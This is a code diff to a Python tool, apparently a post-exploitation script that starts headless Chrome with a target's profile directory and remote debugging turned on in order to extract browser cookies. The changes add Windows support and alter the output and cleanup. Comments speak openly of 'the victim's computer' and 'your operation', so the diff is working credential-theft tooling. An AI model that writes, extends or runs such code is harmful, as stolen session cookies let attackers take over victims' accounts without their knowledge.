@@ -26,9 +26,9 @@ elif sys.platform == "darwin":
     CHROME_CMD = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
     USER_DATA_DIR = "$HOME/Library/Application Support/Google/Chrome"
 
-elif sys.platform.startswith == "win":
-    CHROME_CMD = "chrome.exe"
-    USER_DATA_DIR = r"%LOCALAPPDATA%\Google\Chrome\User Data"
+elif sys.platform.startswith("win"):
+    CHROME_CMD = "\"C:\\Program Files (x86)\\Google\\Chrome\Application\\chrome.exe\""
+    USER_DATA_DIR = "%LOCALAPPDATA%\\Google\\Chrome\\User Data"
 
 else:
     raise RuntimeError("what the heck kind of OS is this? seriously what is '%s'? y'know what i don't hav to deal with this i'm outta here *car ignition noises* *driving noises* *driving noises fade away*" % sys.platform)
@@ -78,7 +78,6 @@ if PROFILE_NAME != "Default":
         ]
     )
 
-
     subprocess.Popen(cmd, shell=True)
 
     USER_DATA_DIR = fake_user_data_dir
@@ -89,6 +88,8 @@ CHROME_DEBUGGING_CMD = """{chrome} --headless --user-data-dir="{user_data_dir}" 
     user_data_dir=USER_DATA_DIR
 )
 
+print(CHROME_DEBUGGING_CMD)
+
 
 def summon_forbidden_protocol():
     """IT COMES"""
@@ -96,9 +97,7 @@ def summon_forbidden_protocol():
     # Supress stdout and stderr from the Chrome process so it doesn't
     # pollute our cookie output, for your copy/pasting convenience.
     process = subprocess.Popen(CHROME_DEBUGGING_CMD,
-                               shell=True,
-                               stdout=subprocess.DEVNULL,
-                               stderr=subprocess.DEVNULL)
+                               shell=True)
 
     # Hey some people have slow computers, quite possibly because of
     # all the malware you're running on them.
@@ -127,8 +126,11 @@ def cleanup(chrome_process):
     # I SURE HOPE there's no race condition, causing this to kill some other
     # innocent PID, crashing the victim's computer and ruining your operation.
 
-    os.kill(chrome_process.pid + 1, signal.SIGKILL)
-
+    if sys.platform.startswith("win"):
+        subprocess.Popen('taskkill /F /PID {0}'.format(chrome_process.pid + 1), shell=True)
+    else:
+        os.kill(chrome_process.pid + 1, signal.SIGKILL)
+    
     # If we copied a Profile's User Data Directory somewhere, clean it up.
     if fake_user_data_dir is not None:
         shutil.rmtree(fake_user_data_dir)
